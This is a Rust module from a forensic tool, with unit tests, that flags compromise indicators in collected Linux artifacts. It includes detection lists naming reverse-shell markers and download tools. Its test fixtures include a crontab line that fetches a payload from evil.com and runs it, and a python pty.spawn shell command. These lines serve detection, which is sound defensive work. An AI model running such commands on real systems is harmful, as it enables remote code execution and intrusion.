//! Alert detection heuristics for forensic investigation data.
//!
//! Scans parsed UAC artifacts for indicators of compromise — suspicious
//! network connections, processes running from temp directories, rootkit
//! detections, and misconfigured system files.

use rt_mft_tree::tree::FileTree;
use rt_parser_uac::parsers::bodyfile::BodyfileEntry;
use rt_parser_uac::parsers::chkrootkit::ChkrootkitFinding;
use rt_parser_uac::parsers::configs::ConfigFile;
use rt_parser_uac::parsers::hash_execs::HashedExecutable;
use rt_parser_uac::parsers::network::NetworkConnection;
use rt_parser_uac::parsers::packages::InstalledPackage;
use rt_parser_uac::parsers::process::{CrontabEntry, ProcessInfo};
use rt_parser_uac::parsers::rootkit::RootkitFinding;
use rt_signatures::heuristics::AnomalyIndex;
use rt_signatures::matching::results::Severity;

// ---------------------------------------------------------------------------
// Types
// ---------------------------------------------------------------------------

/// Severity level of a forensic alert.
#[derive(Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord)]
pub enum AlertSeverity {
    /// Requires immediate attention.
    Critical = 0,
    /// Potentially suspicious, warrants investigation.
    Warning = 1,
    /// Informational finding.
    Info = 2,
}

impl AlertSeverity {
    /// Short prefix label for display.
    #[must_use]
    pub fn label(self) -> &'static str {
        match self {
            Self::Critical => "[!]",
            Self::Warning => "[w]",
            Self::Info => "[i]",
        }
    }
}

/// A single forensic alert raised by heuristic checks.
#[derive(Debug, Clone)]
pub struct Alert {
    pub severity: AlertSeverity,
    pub category: String,
    pub message: String,
    pub detail: String,
}

/// Borrowed slices of parsed artifacts fed into the alert engine.
pub struct AlertInput<'a> {
    pub bodyfile: &'a [BodyfileEntry],
    pub network: &'a [NetworkConnection],
    pub processes: &'a [ProcessInfo],
    pub crontabs: &'a [CrontabEntry],
    pub chkrootkit: &'a [ChkrootkitFinding],
    pub rootkit_findings: &'a [RootkitFinding],
    pub configs: &'a [ConfigFile],
    pub hashes: &'a [HashedExecutable],
    pub packages: &'a [InstalledPackage],
}

// ---------------------------------------------------------------------------
// Main entry point
// ---------------------------------------------------------------------------

/// Run all alert heuristics against the provided artifacts.
///
/// Results are sorted by severity (Critical first, then Warning, then Info).
#[must_use]
pub fn detect_alerts(input: &AlertInput<'_>) -> Vec<Alert> {
    let mut alerts = Vec::new();

    check_network_alerts(input.network, &mut alerts);
    check_unattributed_connections(input.network, &mut alerts);
    check_process_alerts(input.processes, &mut alerts);
    check_chkrootkit_alerts(input.chkrootkit, &mut alerts);
    check_rootkit_finding_alerts(
        input.rootkit_findings,
        input.bodyfile,
        input.hashes,
        &mut alerts,
    );
    check_config_alerts(input.configs, input.crontabs, &mut alerts);
    check_bodyfile_alerts(input.bodyfile, &mut alerts);

    alerts.sort_by_key(|a| a.severity);
    alerts
}

// ---------------------------------------------------------------------------
// Network checks
// ---------------------------------------------------------------------------

/// Flag connections to non-RFC1918 remote addresses.
fn check_network_alerts(connections: &[NetworkConnection], alerts: &mut Vec<Alert>) {
    for conn in connections {
        let addr = conn.remote_addr.as_str();

        // Strip port suffix (1.2.3.4:443 or [::1]:443)
        let ip = addr
            .rsplit_once(':')
            .map_or(addr, |(host, _port)| host)
            .trim_start_matches('[')
            .trim_end_matches(']');

        if ip.is_empty()
            || ip == "*"
            || ip == "0.0.0.0"
            || ip.starts_with("127.")
            || ip.starts_with("10.")
            || ip.starts_with("192.168.")
            || ip == "::"
            || ip == "::1"
        {
            continue;
        }

        if is_rfc1918_172(ip) {
            continue;
        }

        alerts.push(Alert {
            severity: AlertSeverity::Warning,
            category: "network".into(),
            message: format!("External connection to {ip}"),
            detail: format!(
                "local={} remote={} state={}",
                conn.local_addr, conn.remote_addr, conn.state
            ),
        });
    }
}

/// Check whether an IP falls in the 172.16.0.0/12 private range.
#[must_use]
pub fn is_rfc1918_172(ip: &str) -> bool {
    if !ip.starts_with("172.") {
        return false;
    }

    let Some(second_octet_str) = ip.split('.').nth(1) else {
        return false;
    };

    let Ok(second_octet) = second_octet_str.parse::<u8>() else {
        return false;
    };

    (16..=31).contains(&second_octet)
}

// ---------------------------------------------------------------------------
// Process checks
// ---------------------------------------------------------------------------

/// Flag processes running from temp directories and reverse shell patterns.
fn check_process_alerts(processes: &[ProcessInfo], alerts: &mut Vec<Alert>) {
    let temp_prefixes = ["/tmp/", "/dev/shm/", "/var/tmp/"];
    let shell_patterns = ["pty.spawn", "nc -e", "/dev/tcp", "bash -i", "ncat"];

    for proc in processes {
        let cmd = proc.command.as_str();

        // Temp directory execution
        for prefix in &temp_prefixes {
            if cmd.starts_with(prefix) || cmd.contains(&format!(" {prefix}")) {
                alerts.push(Alert {
                    severity: AlertSeverity::Warning,
                    category: "process".into(),
                    message: format!("Process running from {prefix}"),
                    detail: format!("pid={} user={} cmd={}", proc.pid, proc.user, cmd),
                });
                break;
            }
        }

        // Reverse shell patterns
        for pattern in &shell_patterns {
            if cmd.contains(pattern) {
                alerts.push(Alert {
                    severity: AlertSeverity::Critical,
                    category: "process".into(),
                    message: format!("Reverse shell indicator: {pattern}"),
                    detail: format!("pid={} user={} cmd={}", proc.pid, proc.user, cmd),
                });
                break;
            }
        }
    }
}

// ---------------------------------------------------------------------------
// Chkrootkit checks
// ---------------------------------------------------------------------------

/// Flag any chkrootkit finding with INFECTED status.
fn check_chkrootkit_alerts(findings: &[ChkrootkitFinding], alerts: &mut Vec<Alert>) {
    for finding in findings {
        if finding.is_infected {
            alerts.push(Alert {
                severity: AlertSeverity::Critical,
                category: "rootkit".into(),
                message: format!("chkrootkit INFECTED: {}", finding.check_name),
                detail: finding.result.clone(),
            });
        }
    }
}

// ---------------------------------------------------------------------------
// Rootkit finding checks
// ---------------------------------------------------------------------------

/// Convert rootkit indicator findings into alerts with mapped severity.
///
/// Maps `RootkitSeverity` to `AlertSeverity`:
/// - Critical → Critical (known rootkit module, LD_PRELOAD with rootkit lib)
/// - Warning → Warning (unknown ld.so.preload entry, unsigned kernel module)
/// - Info → Info (proprietary module, out-of-tree module)
fn check_rootkit_finding_alerts(
    findings: &[RootkitFinding],
    bodyfile: &[BodyfileEntry],
    hashes: &[HashedExecutable],
    alerts: &mut Vec<Alert>,
) {
    for finding in findings {
        let severity = match finding.severity {
            rt_parser_uac::parsers::rootkit::RootkitSeverity::Critical => AlertSeverity::Critical,
            rt_parser_uac::parsers::rootkit::RootkitSeverity::Warning => AlertSeverity::Warning,
            rt_parser_uac::parsers::rootkit::RootkitSeverity::Info => AlertSeverity::Info,
        };

        let detail = if finding.check == "ld_preload" {
            enrich_ld_preload_detail(&finding.evidence, bodyfile, hashes)
        } else {
            finding.evidence.clone()
        };

        alerts.push(Alert {
            severity,
            category: "rootkit".into(),
            message: format!("[{}] {}", finding.check, finding.description),
            detail,
        });
    }
}

/// Build an enriched detail string for an ld.so.preload finding by
/// cross-referencing the library path against bodyfile and hash data.
fn enrich_ld_preload_detail(
    path: &str,
    bodyfile: &[BodyfileEntry],
    hashes: &[HashedExecutable],
) -> String {
    let mut parts = vec![path.to_string()];

    // Cross-reference against bodyfile for file metadata
    if let Some(entry) = bodyfile.iter().find(|e| e.path == path) {
        parts.push(format!(
            "size={} mode={} uid={} gid={}",
            entry.size, entry.mode, entry.uid, entry.gid
        ));
        if let Some(mtime) = entry.mtime {
            parts.push(format!("mtime={mtime}"));
        }
    } else {
        parts.push("not found in bodyfile".into());
    }

    // Cross-reference against hash executables
    if let Some(entry) = hashes.iter().find(|h| h.path == path) {
        parts.push(format!("{}={}", entry.algorithm, entry.hash));
    }

    parts.join(" | ")
}

// ---------------------------------------------------------------------------
// Unattributed connection checks
// ---------------------------------------------------------------------------

/// Flag active connections (LISTEN/ESTABLISHED) with no process owner.
///
/// When `ss` or `netstat` reports a socket with no PID, it may indicate
/// process hiding by a rootkit (e.g. diamorphine, reptile). Only flags
/// active states (LISTEN, ESTAB, ESTABLISHED) — transient states like
/// CLOSE-WAIT and TIME-WAIT are ignored.
fn check_unattributed_connections(connections: &[NetworkConnection], alerts: &mut Vec<Alert>) {
    let active_states = ["LISTEN", "ESTAB", "ESTABLISHED"];

    for conn in connections {
        if conn.pid.is_some() {
            continue;
        }

        let state_upper = conn.state.to_uppercase();
        if !active_states.iter().any(|s| state_upper.contains(s)) {
            continue;
        }

        alerts.push(Alert {
            severity: AlertSeverity::Warning,
            category: "network".into(),
            message: format!(
                "Unattributed {} connection (no PID — possible process hiding)",
                conn.state
            ),
            detail: format!(
                "proto={} local={} remote={}",
                conn.protocol, conn.local_addr, conn.remote_addr
            ),
        });
    }
}

// ---------------------------------------------------------------------------
// Config checks
// ---------------------------------------------------------------------------

/// Check for suspicious configuration: ld.so.preload and crontab commands.
fn check_config_alerts(configs: &[ConfigFile], crontabs: &[CrontabEntry], alerts: &mut Vec<Alert>) {
    let suspicious_commands = ["wget", "curl", "base64", "nc"];

    // ld.so.preload with content
    for cfg in configs {
        if cfg.path.ends_with("ld.so.preload") && !cfg.content.trim().is_empty() {
            alerts.push(Alert {
                severity: AlertSeverity::Critical,
                category: "config".into(),
                message: "ld.so.preload is non-empty (potential shared-library hijack)".into(),
                detail: cfg.content.lines().next().unwrap_or("").to_string(),
            });
        }
    }

    // Suspicious crontab commands
    for entry in crontabs {
        let cmd_lower = entry.command.to_lowercase();
        for keyword in &suspicious_commands {
            if cmd_lower.contains(keyword) {
                alerts.push(Alert {
                    severity: AlertSeverity::Warning,
                    category: "config".into(),
                    message: format!("Suspicious crontab command ({keyword})"),
                    detail: format!(
                        "schedule={} user={} cmd={}",
                        entry.schedule, entry.user, entry.command
                    ),
                });
                break;
            }
        }
    }
}

// ---------------------------------------------------------------------------
// Bodyfile checks
// ---------------------------------------------------------------------------

/// Standard directories where SUID binaries are expected.
const SUID_SAFE_PREFIXES: &[&str] = &[
    "/usr/bin/",
    "/bin/",
    "/usr/sbin/",
    "/sbin/",
    "/usr/lib/",
    "/usr/libexec/",
];

/// Check bodyfile for executables in temp dirs and unexpected SUID binaries.
fn check_bodyfile_alerts(entries: &[BodyfileEntry], alerts: &mut Vec<Alert>) {
    let temp_prefixes = ["/tmp/", "/dev/shm/", "/var/tmp/"];

    for entry in entries {
        let mode = parse_octal_mode(&entry.mode);

        // Executable in temp directory (mode & 0o111 != 0)
        if mode & 0o111 != 0 {
            for prefix in &temp_prefixes {
                if entry.path.starts_with(prefix) {
                    alerts.push(Alert {
                        severity: AlertSeverity::Warning,
                        category: "filesystem".into(),
                        message: format!("Executable in temp directory: {}", entry.path),
                        detail: format!("mode={} size={}", entry.mode, entry.size),
                    });
                    break;
                }
            }
        }

        // SUID outside standard paths (mode & 0o4000 != 0)
        if mode & 0o4000 != 0 {
            let in_safe_dir = SUID_SAFE_PREFIXES
                .iter()
                .any(|prefix| entry.path.starts_with(prefix));

            if !in_safe_dir {
                alerts.push(Alert {
                    severity: AlertSeverity::Critical,
                    category: "filesystem".into(),
                    message: format!("SUID binary outside standard path: {}", entry.path),
                    detail: format!("mode={} uid={} gid={}", entry.mode, entry.uid, entry.gid),
                });
            }
        }
    }
}

/// Parse an octal mode string (e.g. "100755") into a numeric value.
fn parse_octal_mode(mode_str: &str) -> u32 {
    u32::from_str_radix(mode_str.trim(), 8).unwrap_or(0)
}

// ---------------------------------------------------------------------------
// MFT anomaly → alert conversion
// ---------------------------------------------------------------------------

/// Convert MFT heuristic anomalies into workbench alerts.
///
/// Walks all flagged entries in the anomaly index, resolves their file path
/// from the MFT tree, and converts each anomaly into an `Alert` with the
/// appropriate severity mapping.
#[must_use]
pub fn anomalies_to_alerts(index: &AnomalyIndex, tree: &FileTree) -> Vec<Alert> {
    let mut alerts = Vec::new();

    for node_idx in index.flagged_entries() {
        let path = tree.cached_path(node_idx).to_string();
        for anomaly in index.for_node(node_idx) {
            let severity = match anomaly.severity {
                Severity::Critical => AlertSeverity::Critical,
                Severity::High | Severity::Medium => AlertSeverity::Warning,
                Severity::Low | Severity::Informational => AlertSeverity::Info,
            };

            alerts.push(Alert {
                severity,
                category: format!("MFT/{}", anomaly.category),
                message: format!("[{}] {}", anomaly.rule_id, anomaly.description),
                detail: format!("{path}: {}", anomaly.evidence),
            });
        }
    }

    alerts.sort_by_key(|a| a.severity);
    alerts
}

// ---------------------------------------------------------------------------
// Tests
// ---------------------------------------------------------------------------

#[cfg(test)]
mod tests {
    use super::*;

    fn empty_input() -> AlertInput<'static> {
        AlertInput {
            bodyfile: &[],
            network: &[],
            processes: &[],
            crontabs: &[],
            chkrootkit: &[],
            rootkit_findings: &[],
            configs: &[],
            hashes: &[],
            packages: &[],
        }
    }

    #[test]
    fn empty_input_no_alerts() {
        let alerts = detect_alerts(&empty_input());
        assert!(alerts.is_empty());
    }

    #[test]
    fn reverse_shell_detection() {
        let procs = vec![ProcessInfo {
            pid: 999,
            ppid: 1,
            user: "www-data".into(),
            command: "python3 -c import pty; pty.spawn(\"/bin/bash\")".into(),
            cpu_pct: None,
            mem_pct: None,
            start_time: None,
        }];
        let input = AlertInput {
            processes: &procs,
            ..empty_input()
        };
        let alerts = detect_alerts(&input);
        assert!(
            alerts
                .iter()
                .any(|a| a.severity == AlertSeverity::Critical && a.message.contains("pty.spawn")),
            "expected reverse shell alert, got: {alerts:?}"
        );
    }

    #[test]
    fn temp_executable_detection() {
        let entries = vec![BodyfileEntry {
            md5: String::new(),
            path: "/tmp/evil.sh".into(),
            inode: 0,
            mode: "100755".into(),
            uid: 0,
            gid: 0,
            size: 100,
            atime: Some(1_700_000_000),
            mtime: Some(1_700_000_000),
            ctime: Some(1_700_000_000),
            crtime: None,
        }];
        let input = AlertInput {
            bodyfile: &entries,
            ..empty_input()
        };
        let alerts = detect_alerts(&input);
        assert!(
            alerts.iter().any(|a| a.message.contains("/tmp/evil.sh")),
            "expected temp executable alert, got: {alerts:?}"
        );
    }

    #[test]
    fn suid_outside_standard_path() {
        let entries = vec![BodyfileEntry {
            md5: String::new(),
            path: "/home/user/.hidden/backdoor".into(),
            inode: 0,
            mode: "104755".into(), // SUID + executable
            uid: 0,
            gid: 0,
            size: 50_000,
            atime: None,
            mtime: None,
            ctime: None,
            crtime: None,
        }];
        let input = AlertInput {
            bodyfile: &entries,
            ..empty_input()
        };
        let alerts = detect_alerts(&input);
        assert!(
            alerts
                .iter()
                .any(|a| a.severity == AlertSeverity::Critical && a.message.contains("SUID")),
            "expected SUID alert, got: {alerts:?}"
        );
    }

    #[test]
    fn chkrootkit_infected_finding() {
        let findings = vec![ChkrootkitFinding {
            check_name: "bindshell".into(),
            result: "INFECTED".into(),
            is_infected: true,
        }];
        let input = AlertInput {
            chkrootkit: &findings,
            ..empty_input()
        };
        let alerts = detect_alerts(&input);
        assert!(
            alerts
                .iter()
                .any(|a| a.severity == AlertSeverity::Critical && a.message.contains("bindshell")),
            "expected chkrootkit alert, got: {alerts:?}"
        );
    }

    #[test]
    fn ld_so_preload_alert() {
        let configs = vec![ConfigFile {
            path: "etc/ld.so.preload".into(),
            content: "/lib/libevil.so\n".into(),
        }];
        let input = AlertInput {
            configs: &configs,
            ..empty_input()
        };
        let alerts = detect_alerts(&input);
        assert!(
            alerts
                .iter()
                .any(|a| a.severity == AlertSeverity::Critical
                    && a.message.contains("ld.so.preload")),
            "expected ld.so.preload alert, got: {alerts:?}"
        );
    }

    #[test]
    fn suspicious_crontab_wget() {
        let crontabs = vec![CrontabEntry {
            schedule: "*/5 * * * *".into(),
            command: "wget http://evil.com/payload -O /tmp/x && bash /tmp/x".into(),
            user: "root".into(),
        }];
        let input = AlertInput {
            crontabs: &crontabs,
            ..empty_input()
        };
        let alerts = detect_alerts(&input);
        assert!(
            alerts
                .iter()
                .any(|a| a.category == "config" && a.message.contains("wget")),
            "expected crontab alert, got: {alerts:?}"
        );
    }

    #[test]
    fn alerts_sorted_by_severity() {
        // A mix of inputs that should produce Critical + Warning alerts
        let procs = vec![ProcessInfo {
            pid: 1,
            ppid: 0,
            user: "root".into(),
            command: "python3 -c import pty; pty.spawn(\"/bin/sh\")".into(),
            cpu_pct: None,
            mem_pct: None,
            start_time: None,
        }];
        let crontabs = vec![CrontabEntry {
            schedule: "0 * * * *".into(),
            command: "curl http://example.com/update".into(),
            user: "nobody".into(),
        }];
        let input = AlertInput {
            processes: &procs,
            crontabs: &crontabs,
            ..empty_input()
        };
        let alerts = detect_alerts(&input);
        assert!(alerts.len() >= 2);

        // Verify ordering: Critical comes before Warning
        for window in alerts.windows(2) {
            assert!(
                window[0].severity <= window[1].severity,
                "alerts not sorted: {:?} should come before {:?}",
                window[0].severity,
                window[1].severity
            );
        }
    }

    #[test]
    fn is_rfc1918_172_valid() {
        assert!(is_rfc1918_172("172.16.0.1"));
        assert!(is_rfc1918_172("172.31.255.255"));
        assert!(is_rfc1918_172("172.20.10.5"));
    }

    #[test]
    fn anomalies_to_alerts_maps_severity() {
        use rt_signatures::heuristics::anomaly::{Anomaly, AnomalyCategory};

        // Build a minimal MFT tree with one node
        let tree = FileTree::test_single_node("C:\\Windows\\Temp\\evil.exe");

        let mut index = AnomalyIndex::new();
        index.add(
            0,
            Anomaly {
                severity: Severity::Critical,
                category: AnomalyCategory::Timestomping,
                rule_id: "HEUR-TS-001",
                description: "SI/FN timestamp mismatch".into(),
                evidence: "SI modified 2024-01-01, FN modified 2020-01-01".into(),
            },
        );
        index.add(
            0,
            Anomaly {
                severity: Severity::Low,
                category: AnomalyCategory::SuspiciousLocation,
                rule_id: "HEUR-LOC-001",
                description: "Executable in temp directory".into(),
                evidence: "path matches temp pattern".into(),
            },
        );

        let alerts = anomalies_to_alerts(&index, &tree);
        assert_eq!(alerts.len(), 2);

        // Sorted by severity: Critical first, then Info (Low maps to Info)
        assert_eq!(alerts[0].severity, AlertSeverity::Critical);
        assert!(alerts[0].category.starts_with("MFT/"));
        assert!(alerts[0].message.contains("HEUR-TS-001"));
        assert_eq!(alerts[1].severity, AlertSeverity::Info);
    }

    #[test]
    fn anomalies_to_alerts_empty_index() {
        let tree = FileTree::test_single_node("C:\\test.txt");
        let index = AnomalyIndex::new();
        let alerts = anomalies_to_alerts(&index, &tree);
        assert!(alerts.is_empty());
    }

    #[test]
    fn is_rfc1918_172_invalid() {
        assert!(!is_rfc1918_172("172.15.0.1"));
        assert!(!is_rfc1918_172("172.32.0.1"));
        assert!(!is_rfc1918_172("10.0.0.1"));
        assert!(!is_rfc1918_172("192.168.1.1"));
        assert!(!is_rfc1918_172("8.8.8.8"));
        assert!(!is_rfc1918_172(""));
    }

    // =====================================================================
    // Rootkit finding → alert conversion
    // =====================================================================

    #[test]
    fn rootkit_critical_finding_maps_to_critical_alert() {
        use rt_parser_uac::parsers::rootkit::RootkitSeverity;
        let findings = vec![RootkitFinding {
            severity: RootkitSeverity::Critical,
            check: "kernel_module".into(),
            description: "Known rootkit kernel module 'diamorphine' loaded".into(),
            evidence: "diamorphine".into(),
        }];
        let input = AlertInput {
            rootkit_findings: &findings,
            ..empty_input()
        };
        let alerts = detect_alerts(&input);
        assert!(
            alerts.iter().any(|a| a.severity == AlertSeverity::Critical
                && a.category == "rootkit"
                && a.message.contains("diamorphine")),
            "expected critical rootkit alert, got: {alerts:?}"
        );
    }

    #[test]
    fn rootkit_warning_finding_maps_to_warning_alert() {
        use rt_parser_uac::parsers::rootkit::RootkitSeverity;
        let findings = vec![RootkitFinding {
            severity: RootkitSeverity::Warning,
            check: "ld_preload".into(),
            description: "Library found in ld.so.preload".into(),
            evidence: "/lib/libymv.so.3".into(),
        }];
        let input = AlertInput {
            rootkit_findings: &findings,
            ..empty_input()
        };
        let alerts = detect_alerts(&input);
        assert!(
            alerts
                .iter()
                .any(|a| a.severity == AlertSeverity::Warning && a.category == "rootkit"),
            "expected warning rootkit alert, got: {alerts:?}"
        );
    }

    #[test]
    fn rootkit_info_finding_maps_to_info_alert() {
        use rt_parser_uac::parsers::rootkit::RootkitSeverity;
        let findings = vec![RootkitFinding {
            severity: RootkitSeverity::Info,
            check: "kernel_taint".into(),
            description: "Proprietary kernel module loaded".into(),
            evidence: "taint=1, bit 0 set".into(),
        }];
        let input = AlertInput {
            rootkit_findings: &findings,
            ..empty_input()
        };
        let alerts = detect_alerts(&input);
        assert!(
            alerts
                .iter()
                .any(|a| a.severity == AlertSeverity::Info && a.category == "rootkit"),
            "expected info rootkit alert, got: {alerts:?}"
        );
    }

    #[test]
    fn rootkit_empty_findings_no_alerts() {
        let input = AlertInput {
            rootkit_findings: &[],
            ..empty_input()
        };
        let alerts = detect_alerts(&input);
        // Only rootkit-related — with empty input everywhere, should be empty
        assert!(alerts.is_empty());
    }

    #[test]
    fn rootkit_multiple_findings_all_converted() {
        use rt_parser_uac::parsers::rootkit::RootkitSeverity;
        let findings = vec![
            RootkitFinding {
                severity: RootkitSeverity::Critical,
                check: "kernel_module".into(),
                description: "diamorphine loaded".into(),
                evidence: "diamorphine".into(),
            },
            RootkitFinding {
                severity: RootkitSeverity::Warning,
                check: "kernel_taint".into(),
                description: "Unsigned module".into(),
                evidence: "taint=4096".into(),
            },
            RootkitFinding {
                severity: RootkitSeverity::Info,
                check: "kernel_taint".into(),
                description: "Proprietary module".into(),
                evidence: "taint=1".into(),
            },
        ];
        let input = AlertInput {
            rootkit_findings: &findings,
            ..empty_input()
        };
        let alerts = detect_alerts(&input);
        let rootkit_alerts: Vec<_> = alerts.iter().filter(|a| a.category == "rootkit").collect();
        assert_eq!(rootkit_alerts.len(), 3);
    }

    // =====================================================================
    // Cross-parser correlation — enriched rootkit alerts
    // =====================================================================

    #[test]
    fn rootkit_ld_preload_enriched_with_bodyfile_metadata() {
        use rt_parser_uac::parsers::rootkit::RootkitSeverity;
        let findings = vec![RootkitFinding {
            severity: RootkitSeverity::Warning,
            check: "ld_preload".into(),
            description: "Library found in ld.so.preload".into(),
            evidence: "/lib/libevil.so".into(),
        }];
        let bodyfile = vec![BodyfileEntry {
            md5: "d41d8cd98f00b204e9800998ecf8427e".into(),
            path: "/lib/libevil.so".into(),
            inode: 12345,
            mode: "100755".into(),
            uid: 0,
            gid: 0,
            size: 98304,
            atime: Some(1_700_000_000),
            mtime: Some(1_700_000_000),
            ctime: Some(1_700_000_000),
            crtime: None,
        }];
        let input = AlertInput {
            rootkit_findings: &findings,
            bodyfile: &bodyfile,
            ..empty_input()
        };
        let alerts = detect_alerts(&input);
        let rootkit_alerts: Vec<_> = alerts.iter().filter(|a| a.category == "rootkit").collect();
        assert!(!rootkit_alerts.is_empty());
        let detail = &rootkit_alerts[0].detail;
        assert!(
            detail.contains("size=98304"),
            "expected bodyfile size in detail, got: {detail}"
        );
        assert!(
            detail.contains("mode=100755"),
            "expected bodyfile mode in detail, got: {detail}"
        );
    }

    #[test]
    fn rootkit_ld_preload_enriched_with_hash() {
        use rt_parser_uac::parsers::rootkit::RootkitSeverity;
        let findings = vec![RootkitFinding {
            severity: RootkitSeverity::Critical,
            check: "ld_preload".into(),
            description: "Known rootkit library in ld.so.preload: jynx".into(),
            evidence: "/lib/libjynx.so".into(),
        }];
        let hashes = vec![HashedExecutable {
            hash: "abc123def456".into(),
            path: "/lib/libjynx.so".into(),
            algorithm: "md5".into(),
        }];
        let input = AlertInput {
            rootkit_findings: &findings,
            hashes: &hashes,
            ..empty_input()
        };
        let alerts = detect_alerts(&input);
        let rootkit_alerts: Vec<_> = alerts.iter().filter(|a| a.category == "rootkit").collect();
        assert!(!rootkit_alerts.is_empty());
        let detail = &rootkit_alerts[0].detail;
        assert!(
            detail.contains("md5=abc123def456"),
            "expected hash in detail, got: {detail}"
        );
    }

    #[test]
    fn rootkit_ld_preload_enriched_with_both_bodyfile_and_hash() {
        use rt_parser_uac::parsers::rootkit::RootkitSeverity;
        let findings = vec![RootkitFinding {
            severity: RootkitSeverity::Warning,
            check: "ld_preload".into(),
            description: "Library found in ld.so.preload".into(),
            evidence: "/lib/libymv.so.3".into(),
        }];
        let bodyfile = vec![BodyfileEntry {
            md5: String::new(),
            path: "/lib/libymv.so.3".into(),
            inode: 999,
            mode: "100644".into(),
            uid: 0,
            gid: 0,
            size: 45056,
            atime: Some(1_700_000_000),
            mtime: Some(1_695_000_000),
            ctime: Some(1_695_000_000),
            crtime: None,
        }];
        let hashes = vec![HashedExecutable {
            hash: "deadbeef12345678".into(),
            path: "/lib/libymv.so.3".into(),
            algorithm: "sha1".into(),
        }];
        let input = AlertInput {
            rootkit_findings: &findings,
            bodyfile: &bodyfile,
            hashes: &hashes,
            ..empty_input()
        };
        let alerts = detect_alerts(&input);
        let rootkit_alerts: Vec<_> = alerts.iter().filter(|a| a.category == "rootkit").collect();
        assert!(!rootkit_alerts.is_empty());
        let detail = &rootkit_alerts[0].detail;
        assert!(
            detail.contains("size=45056"),
            "expected bodyfile size, got: {detail}"
        );
        assert!(
            detail.contains("sha1=deadbeef12345678"),
            "expected hash, got: {detail}"
        );
    }

    #[test]
    fn rootkit_non_ld_preload_not_enriched() {
        use rt_parser_uac::parsers::rootkit::RootkitSeverity;
        // kernel_module findings have no file path to cross-reference
        let findings = vec![RootkitFinding {
            severity: RootkitSeverity::Critical,
            check: "kernel_module".into(),
            description: "Known rootkit kernel module 'diamorphine' loaded".into(),
            evidence: "diamorphine".into(),
        }];
        // Even with bodyfile/hash data present, non-ld_preload findings shouldn't be enriched
        let bodyfile = vec![BodyfileEntry {
            md5: String::new(),
            path: "/some/unrelated/file".into(),
            inode: 1,
            mode: "100644".into(),
            uid: 0,
            gid: 0,
            size: 100,
            atime: None,
            mtime: None,
            ctime: None,
            crtime: None,
        }];
        let input = AlertInput {
            rootkit_findings: &findings,
            bodyfile: &bodyfile,
            ..empty_input()
        };
        let alerts = detect_alerts(&input);
        let rootkit_alerts: Vec<_> = alerts.iter().filter(|a| a.category == "rootkit").collect();
        assert_eq!(rootkit_alerts.len(), 1);
        assert_eq!(rootkit_alerts[0].detail, "diamorphine");
    }

    #[test]
    fn rootkit_ld_preload_no_bodyfile_match_shows_not_found() {
        use rt_parser_uac::parsers::rootkit::RootkitSeverity;
        let findings = vec![RootkitFinding {
            severity: RootkitSeverity::Warning,
            check: "ld_preload".into(),
            description: "Library found in ld.so.preload".into(),
            evidence: "/lib/libghost.so".into(),
        }];
        // Empty bodyfile — the library isn't on disk
        let input = AlertInput {
            rootkit_findings: &findings,
            ..empty_input()
        };
        let alerts = detect_alerts(&input);
        let rootkit_alerts: Vec<_> = alerts.iter().filter(|a| a.category == "rootkit").collect();
        assert!(!rootkit_alerts.is_empty());
        let detail = &rootkit_alerts[0].detail;
        assert!(
            detail.contains("not found in bodyfile"),
            "expected 'not found in bodyfile' when no match, got: {detail}"
        );
    }

    // =====================================================================
    // Unattributed connection detection
    // =====================================================================

    #[test]
    fn unattributed_listen_connection_flagged() {
        let conns = vec![NetworkConnection {
            protocol: "tcp".into(),
            local_addr: "0.0.0.0:3333".into(),
            remote_addr: "0.0.0.0:*".into(),
            state: "LISTEN".into(),
            pid: None,
            program: None,
        }];
        let input = AlertInput {
            network: &conns,
            ..empty_input()
        };
        let alerts = detect_alerts(&input);
        assert!(
            alerts.iter().any(|a| a.category == "network"
                && a.message.contains("Unattributed")
                && a.message.contains("LISTEN")),
            "expected unattributed LISTEN alert, got: {alerts:?}"
        );
    }

    #[test]
    fn unattributed_established_connection_flagged() {
        let conns = vec![NetworkConnection {
            protocol: "tcp".into(),
            local_addr: "192.168.1.10:45678".into(),
            remote_addr: "10.0.0.5:443".into(),
            state: "ESTAB".into(),
            pid: None,
            program: None,
        }];
        let input = AlertInput {
            network: &conns,
            ..empty_input()
        };
        let alerts = detect_alerts(&input);
        assert!(
            alerts.iter().any(|a| a.category == "network"
                && a.message.contains("Unattributed")
                && a.message.contains("ESTAB")),
            "expected unattributed ESTABLISHED alert, got: {alerts:?}"
        );
    }

    #[test]
    fn attributed_listen_no_unattributed_alert() {
        let conns = vec![NetworkConnection {
            protocol: "tcp".into(),
            local_addr: "0.0.0.0:22".into(),
            remote_addr: "0.0.0.0:*".into(),
            state: "LISTEN".into(),
            pid: Some(1234),
            program: Some("sshd".into()),
        }];
        let input = AlertInput {
            network: &conns,
            ..empty_input()
        };
        let alerts = detect_alerts(&input);
        assert!(
            !alerts.iter().any(|a| a.message.contains("Unattributed")),
            "should not flag attributed connection, got: {alerts:?}"
        );
    }

    #[test]
    fn unattributed_closed_wait_not_flagged() {
        // CLOSE-WAIT and TIME-WAIT are transient — only flag active states
        let conns = vec![NetworkConnection {
            protocol: "tcp".into(),
            local_addr: "192.168.1.10:45678".into(),
            remote_addr: "10.0.0.5:80".into(),
            state: "CLOSE-WAIT".into(),
            pid: None,
            program: None,
        }];
        let input = AlertInput {
            network: &conns,
            ..empty_input()
        };
        let alerts = detect_alerts(&input);
        assert!(
            !alerts.iter().any(|a| a.message.contains("Unattributed")),
            "should not flag CLOSE-WAIT, got: {alerts:?}"
        );
    }
}
